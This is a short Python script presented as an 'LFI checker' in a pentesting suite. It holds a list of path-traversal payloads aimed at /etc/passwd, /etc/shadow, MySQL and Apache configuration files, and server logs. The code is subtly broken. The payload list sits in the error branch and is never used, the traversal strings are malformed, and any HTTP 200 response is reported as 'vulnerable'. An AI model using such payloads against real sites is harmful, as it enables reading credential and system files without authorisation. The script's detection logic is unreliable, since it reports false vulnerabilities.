## Software Name: Anarchist - LFI Checker
## Version: 1.0
## Software Description: This piece of code is used too check for LFI.
## Software Author: g0dsecurity

## Importing modules
import requests
import argparse
from termcolor import colored
import os
import sys
import threading

argparser = argparse.ArgumentParser(description="Anarchist - A Pentesting Suite of tools")
argparser.add_argument("-l","--list",help="List of websites to check")
args = argparser.parse_args()

args_list = args.list

def banner():
    print(colored('''
                                    .__    .__          __   
 _____    ____ _____ _______   ____ |  |__ |__| _______/  |_ 
 \__  \  /    \\__  \\_  __ \_/ ___\|  |  \|  |/  ___/\   __\
  / __ \|   |  \/ __ \|  | \/\  \___|   Y  \  |\___ \  |  |  
 (____  /___|  (____  /__|    \___  >___|  /__/____  > |__|  
      \/     \/     \/            \/     \/        \/       
    ''',"red"))

def main():
    if args.list:
        list = args.list
        try:
            file = open(list,"r")
            for website in file.readlines():
                website = website.strip()
                try:
                    r = requests.get(website)
                    if r.status_code == 200:
                        print(colored("[+] Website is vulnerable to LFI","green"))
                    else:
                        print(colored("[-] Website is not vulnerable to LFI","red"))
                except:
                    print(colored("[-] Error while sending request","red"))
        except:
            print(colored("[-] Error while opening file","red"))
    else:
        print(colored("[-] Invalid arguments","red"))
        print(colored("[-] Use -h or --help for help","red"))

        ## Lista de Payloads
        payload = [
            ".../.../etc/passwd",
            ".../.../etc/ftpchroot",
            ".../.../etc/shadow",
            ".../.../etc/group",
            ".../.../etc/hosts",
            ".../.../etc/motd",
            ".../.../etc/mysql/my.cnf",
            ".../.../etc/httpd/conf/httpd.conf",
            ".../.../etc/httpd/conf.d",
            ".../.../etc/httpd/logs/access_log",
            ".../.../etc/httpd/logs/access.log",
            ".../.../etc/httpd/logs/error_log",
            ".../.../etc/httpd/logs/error.log",
            
        ]
if __name__ == "__main__":
    banner()
    main()